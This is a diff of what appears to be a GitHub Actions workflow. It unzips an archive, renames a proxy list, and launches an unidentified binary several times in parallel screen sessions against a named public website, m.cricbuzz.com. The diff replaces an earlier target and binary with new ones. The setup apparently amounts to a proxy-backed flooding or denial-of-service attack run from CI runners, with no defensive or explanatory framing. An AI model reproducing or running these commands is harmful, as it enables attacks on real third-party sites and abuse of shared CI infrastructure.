@@ -33,12 +33,12 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
-          chmod +x ki
-          export TARGET="https://ilicit.services"
-          screen -dms ve ./ki $TARGET 200 1 1 
-          screen -dms ve ./ki $TARGET 200 1 1 
-          screen -dms ve ./ki $TARGET 200 1 1
-          ./ki $TARGET 200 1 1 
+          chmod +x tol
+          export TARGET="https://m.cricbuzz.com/"
+          screen -dms ve ./tol $TARGET 200 1 1 90.txt
+          screen -dms ve ./tol $TARGET 200 1 1 90.txt
+          
+          ./tol $TARGET 200 1 1 90.txt
           
           
           
